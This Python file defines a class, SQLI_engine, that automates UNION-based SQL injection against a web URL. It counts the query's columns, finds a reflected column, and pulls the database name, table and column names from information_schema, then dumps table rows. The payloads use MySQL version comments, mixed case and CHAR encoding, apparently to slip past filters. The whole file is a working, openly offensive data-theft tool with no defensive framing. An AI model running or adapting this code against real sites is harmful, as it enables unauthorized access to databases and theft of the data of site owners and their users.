import requests
"""
This class encapsulates the sql injection process.
This process llooks like:
1. Get db name, save to Database object
2. Build url injection query for tables
3. Get tables, save to Tables objects
4. Build url injection query for each tables to get columns and data
5. Scrape data and save to dictionary

"""
class SQLI_engine:
    def __init__(self, url):
        #url of injection (no parameters)
        self.base_url = url
        #list of vulnerable columns
        self.vul_columns = None
        #list of all columns
        self.all_columns = None
        #databases available
        self.databases = []
        #key to transform url to sqli request
        self.wizard_string = "0x2d31+/*!50000union*/+/*!50000select*/"
        #temp list
        self.helper = ["", ""]
        #key to select columns
        self.magic_key = "1620597971540027"

        #run two methonds on objects initialization
        #get all columns
        self.find_all_columns()
        #get vulnerable columns
        self.find_vul_columns()

    #method to get count of all columns
    def find_all_columns(self):
        #build url request to extract columns
        url = str(self.base_url + self.wizard_string)
        print(url)
        #check first 50 results
        for i in range(1, 50):
            if i != 1 and i != 50:
                url = str(url)
                url += ", "
            url += str(self.magic_key)
            print(url)
            res = requests.get(url).content.decode('utf-8')
            print("AFTER" + str(url))
            print(res.find("union select"))
            print(res.find(self.magic_key))
            #if no more columns (union select returls None)
            if res.find("union select") == -1 and res.find(self.magic_key) != -1:
                #keep number of all columns
                self.all_columns = i
                return
        self.all_columns = 0

    #method to get count of vulnerable columns
    def find_vul_columns(self):
        #ckeck all coulumns
        for i in range(1, self.all_columns + 1):
            ttemp = self.wizard_string
            #add ne columns request to main request - self.wizard_string
            for j in range(1, self.all_columns + 1):
                if j != 1 and j != self.all_columns + 1:
                    ttemp = ttemp + ", "
                if i == j:
                    ttemp += "/*!50000ConCat(0x27," + self.magic_key + ",0x27)*/"
                else:
                    ttemp += "/*!50000ConCat(0x27," + str(j) + ",0x27)*/"
            #get results by new url created
            res = requests.get(self.base_url + ttemp).content.decode('utf-8')
            #if result is vulnerable - keel number of vul columns
            if res.find(self.magic_key) != -1:
                self.vul_columns = i
                return
        self.vul_columns = 0

    #method to cut sqli result and return string with parameters
    def find_variables(self, data):
        #find index of ^'
        base_position = data.find("^'")
        if base_position != -1:
            #add length of ^'
            ini = data[base_position + 2:]
            base_position = ini.find("'^")
            if base_position != -1:
                #return parameters string
                return ini[:base_position]
            else:
                pass
    #method to get db name and tables
    def get_db(self):
        #build url to get db name
        self.helper = [self.base_url + self.wizard_string, ""]
        param = ""
        counter = 0
        #for every column available
        for i in range(1, self.all_columns + 1):
            #add coma to result
            if i != 1 and i != self.all_columns + 1:
                param = ","
            #first step
            if counter == 0:
                if i != self.vul_columns:
                    self.helper[counter] += param + str(i)
                    param += str(i)
                else:
                    if i != 1:
                        self.helper[counter] += ","
                    counter = 1
            else:
                #second step
                self.helper[counter] += param + str(i)
        res = requests.get(
            self.helper[0] + "/*!50000Group_Concat(0x5e27,database(),0x275e)*/" + self.helper[1]).content.decode('utf-8')
        return self.find_variables(res)

    #method to get table names
    def get_tables(self):
        #build sql injection url to get table names
        part1 = self.helper[0] + "/*!50000Concat(0x5e27,/*!50000gROup_cONcat(table_name)*/,0x275e)"
        part2 = self.helper[
                    1] + "++from+/*!50000inforMAtion_schema*/.tables+ /*!50000wHEre*/+/*!50000taBLe_scheMA*/like+database()--+"
        #retturn table names
        return self.find_variables(requests.get(part1 + part2).content.decode('utf-8'))

    #mathod to get column names of some table
    def get_columns(self, table):
        """
        :param table: table name
        :return:
        """
        #build sql injection url to get table names
        #change table name to ord-format
        char = ""
        for item in table:
            char += str(ord(item))
            if len(table) - 1 != table.index(item):
                char += ", "
        #build url for sql injection
        part1 = self.helper[0] + "/*!50000Concat(0x5e27,/*!50000gROup_cONcat(column_name)*/,0x275e)"
        part2 = self.helper[
                  1] + "++from+/*!50000inforMAtion_schema*/.columns+ /*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(" + char + ")--+"
        #get html source
        res = requests.get(part1 + part2).content.decode('utf-8')
        #return coulumns as comma separated strings
        return self.find_variables(res)

    #the last step  of processing - get data itself
    def scrape_data(self, columns, db_table, res_dict):
        """
        :param columns: columns of some table
        :param db_table: table name
        :param res_dict: dictionary to save the results
        :return:
        """
        #build url if sql injection
        url = self.build_injection_url(columns, db_table)
        #get html source
        res = requests.get(url).content.decode('utf-8')
        #find parameters comma separated
        data = self.find_variables(res)
        try:
            #split sting with parametees to list
            rows = data.split(",")
            #add to result dict
            res_dict[columns[0]] = rows
        except Exception:
            pass

    #build injection url for given columns and table
    def build_injection_url(self, columns, db_table):
        base_string = ""
        title_string = ""
        #for each column name
        for name in columns:
            #add column name to result
            title_string += name + "\t"
            if columns.index(name) != 0:
                base_string += ",0x3a,"
            base_string += name
        #return url for sql injection
        return self.helper[0] + "/*!50000ConCAt(0x5e27,/*!50000gROup_cONcat({})*/,0x275e)".format(base_string) + \
               self.helper[
                   1] + "+from+" + db_table + "--+-"
